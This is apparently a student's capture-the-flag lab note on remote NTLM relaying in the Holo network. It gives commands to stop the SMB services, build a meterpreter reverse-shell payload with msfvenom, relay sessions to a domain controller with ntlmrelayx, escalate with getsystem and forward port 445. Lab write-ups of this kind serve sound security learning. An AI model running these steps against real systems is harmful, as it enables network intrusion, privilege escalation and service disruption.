As has been previously eluded to, we can use a newly researched attack to exploit NTLM sessions. This attack works by forcing the server to stop SMB traffic and restart the server to send all traffic to the attacker. The attacker can then relay the session where they want. Credit to the research behind this exploit goes to SpookySec, one of the creators of Holo. Find the original blog post here, [https://blog.spookysec.net/remote-ntlm-relaying/](https://blog.spookysec.net/remote-ntlm-relaying/).  

Remote NTLM relaying is not a widely discussed or popular attack vector, with the only reference before this research being this blog, [https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/](https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/).  

The reason this attack vector isn't widely used is that it is very disruptive. If the server is busy, you are unintentionally creating an SMB DoS and creating server downtime. In a real engagement, this is a huge problem. This attack can be used with explicit authorization from the client and contributes to the ever-moving exploit and red team research. A white card may be used in place of this exploit in the real world, as mentioned in Task 8.  

To begin crafting this exploit, we will need to install multiple packages specific to non-standard Kerberos that the relay uses. Find the packages below.  

- `krb5-user`
- `cifs-utils`

These can be installed using apt with the command below.  

Command: `apt install krb5-user cifs-utils`

To begin configuring the server for the exploit, we will need to start turning off SMB services and restart the server. Find an outline of the steps taken below.  

Begin by disabling NetLogon. Find the command used below.  

Command used: `sc stop netlogon`

Next, we need to disable and stop the SMB server from starting at boot. We can do this by disabling LanManServer and modifying the configuration. Find the command used below.  

Command used: `sc stop lanmanserver` and `sc config lanmanserver start= disabled`

To entirely stop SMB, we will also need to disable LanManServer and modify its configuration. Find the command used below.  

Command used: `sc stop lanmanworkstation` and `sc config lanmanworkstation start= disabled`

The steps taken may seem very confusing and convoluted because Windows does not want to stop the SMB service completely.  

We can now restart the machine; it is essential that you restart the device and not shut down the device. Give the server a few minutes to restart; scan the server again and ensure it returns as closed.

---
RDP back into the machine; stopping NetLogon can cause issues in some RDP clients, so it is recommended to use `rdesktop`.  

At this point of the attack, we recommend using Metasploit as it offers enhanced proxy functionality and traffic routing. Create a basic payload with Metasploit and execute it on the server. Find example usage below.  

Example usage: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=1337 -f exe > shell.exe`

Now that we have stopped the SMB service and can control how our traffic is routed, we can begin exploitation. First, we need to start NTLMRelayX, specifying the domain controller and protocol to exploit, in this case, SMB. Find syntax for NTLMRelayX below.  

Syntax: `ntlmrelayx.py -t smb://<DC> -smb2support -socks`

We have now set up a relay client to route sessions through a SOCKs proxy.  

We can now force the connection using Metasploit port forwarding. Find an example command below.  

Example command: `portfwd add -R -L 0.0.0.0 -l 445 -p 445`

After waiting about 1-3 minutes, you should see a new inbound SMB connection. Now that we have the SOCKs tunnel open, we can use proxy chains to use this session with several offensive tools, shown in the next task.  

At this point, we should have a successful relay, and we can move on to weaponizing the relay in the next task.

---
**Troubleshooting -**

**Problem:**  

- You are not receiving any inbound SMB connections from NTLMRelayX.

**Solution 1**

- Ensure that you started running NTLMRelayX running **before** you created the Port Forward. If you did not, restart the machine.

**Solution 2**

- Ensure that you ran NTLMRelayX with the -smb2support flag.

**Problem**

- I am receiving inbound SMB Connections, but a session between the Domain Controller fails to establish.

**Solution 1**

- Ensure that there is connectivity between your attacking device and the Domain Controller. You can test this with smbclient -L ///<dcip/>/. We recommend using SSHuttle over Chisel for this portion, as you would need to juggle multiple ProxyChains config files with Chisel. SSHuttle makes this process overall easier by automagically adjusting your devices routing table.

**Solution 2**

- Verify that this is not an issue with your NTLMRelayX version. We have a report from a user that their specific version of NTLMRelayX did not work. We have verified that **version 0.9.22** works without any issues.

---

# Your job

## Close everything on SMB Port

- Use the SMB Port from the compromised server `10.200.X.35` , so you have to RDP with rdesktop.

```
$ rdesktop -u abcuser -p Abc1234! 10.200.X.35
```

- Close every service running there to make it free. For that use a **cmd** access on the compromised server and execute the following commands.

```
sc stop netlogon  
sc stop lanmanserver  
sc config lanmanserver start= disabled  
sc stop lanmanworkstation  
sc config lanmanworkstation start= disabled
```

- Restart the machine.

```
shutdown -r
```

## Create a basic payload with Metasploit and execute it on the server

- On the attacking machine run:

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=1337 -f exe > shell.exe
```

## Exploitation

- On the attacking machine run:

```
$ impacket-ntlmrelayx -t smb://10.200.110.30 -smb2support -socks
```

![[Task 47 - Why not just turn it off?-20241122144645114.webp]]

- Run the malicious binary for the DLL hijacking to get a reverse shell. [[Task 43 - WERE TAKING OVER THIS DLL!#DLL Hijacking]]

- Once the meterpreter is there, you should be your added user, you can check this by running:

```
getuid
```

- Elevate the SYSTEM running:

```
getsystem
```

![[Task 47 - Why not just turn it off?-20241122150133824.webp]]

- Set up a port forward with Metasploit:

```
portfwd add -R -L 0.0.0.0 -l 445 -p 445
```

After a while ntlmrelay starts getting data.

![[Task 47 - Why not just turn it off?-20241122150405855.webp]]

> [!success]
> Although we got a warning about the Unsupported MechType it looks like a SOCKS connection is added, so we have access!


**Next step:** [[Task 48 - Ready your weapons]]
